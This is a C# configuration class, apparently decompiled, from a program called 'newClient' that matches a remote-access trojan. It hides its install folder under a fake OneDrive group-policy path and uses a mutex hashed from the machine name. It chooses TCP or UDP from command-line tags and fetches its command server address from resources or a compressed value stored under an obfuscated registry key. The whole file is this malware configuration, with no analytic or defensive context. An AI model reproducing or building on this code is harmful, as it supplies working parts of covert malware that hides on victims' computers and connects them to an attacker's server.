using System;
using System.IO;
using System.Text;
using Microsoft.Win32;
using Models;
using algorithm;
using client.Properties;
using newClient.Utilities;

namespace newClient;

internal sealed class config
{
	public static bool IsMutex = true;

	public static readonly string SessionKey = MidManager.GetNewMid();

	public static readonly _sessiongrid session = clienthelper.GetSessioninfo();

	public static string path = Environment.GetEnvironmentVariable("systemdrive") + "\\ProgramData\\OneDrive\\PendingGPOs\\" + random + "gpo";

	public static ProType _PProType { get; set; }

	public static ProType PProType
	{
		get
		{
			if (_PProType == (ProType)0)
			{
				if (Environment.CommandLine.EndsWith("gotcp"))
				{
					_PProType = ProType.TCP;
				}
				else if (Environment.CommandLine.EndsWith("goudp"))
				{
					_PProType = ProType.UDP;
				}
				else
				{
					object data = AppDomain.CurrentDomain.GetData("ProType");
					if (data == null)
					{
						_PProType = (ProType)Enum.Parse(typeof(ProType), Resources.ProType);
					}
					else
					{
						_PProType = (ProType)Enum.Parse(typeof(ProType), data.ToString());
					}
				}
				return _PProType;
			}
			return _PProType;
		}
	}

	public static string host
	{
		get
		{
			try
			{
				string text = null;
				object data = AppDomain.CurrentDomain.GetData("Host");
				text = ((data == null) ? Resources.Host : data.ToString());
				if (text.Equals("bbbb"))
				{
					string hash = Hash.GetHash(Environment.MachineName, "@");
					using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\" + hash);
					byte[] array = registryKey.GetValue(hash + "ht") as byte[];
					if (array == null || array.Length != 0)
					{
						text = Encoding.UTF8.GetString(GZip.Decompress(array));
					}
				}
				return text;
			}
			catch
			{
			}
			return null;
		}
	}

	public static string MutexName
	{
		get
		{
			string result = "unknown";
			try
			{
				result = Hash.GetHash(Environment.MachineName, "$");
				return result;
			}
			catch
			{
				return result;
			}
		}
	}

	public static byte[] exceptionbytes
	{
		get
		{
			byte[] array = null;
			try
			{
				if (!File.Exists(Logger.currentExceptionPath))
				{
					return null;
				}
				array = File.ReadAllBytes(Logger.currentExceptionPath);
				if (array.Length == 0 || array.Length > 1048576)
				{
					return null;
				}
				File.Delete(Logger.currentExceptionPath);
				return array;
			}
			catch (Exception ex)
			{
				return Encoding.UTF8.GetBytes(ex.Message + ex.StackTrace);
			}
		}
	}

	public static string random
	{
		get
		{
			try
			{
				return Environment.MachineName.ToLower().Split(new char[1] { '-' })[1];
			}
			catch
			{
				return Environment.MachineName.ToLower();
			}
		}
	}
}
